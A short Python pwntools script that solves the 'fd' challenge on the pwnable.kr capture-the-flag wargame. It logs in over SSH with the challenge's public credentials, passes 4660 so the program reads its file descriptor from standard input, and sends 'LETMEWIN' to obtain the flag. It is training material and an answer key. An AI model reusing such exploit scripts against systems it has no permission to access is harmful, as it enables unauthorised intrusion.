from pwn import *

# Connect to target #
r = ssh(host='pwnable.kr',
        user='fd',
        password='guest',
        port=2222)

# Run program #
p = r.process(['fd','4660'])

# Send "LETMEWIN\n" to STDIN
p.sendline('LETMEWIN')

# Recieve output from the process #
output = p.recvall()

print(output)

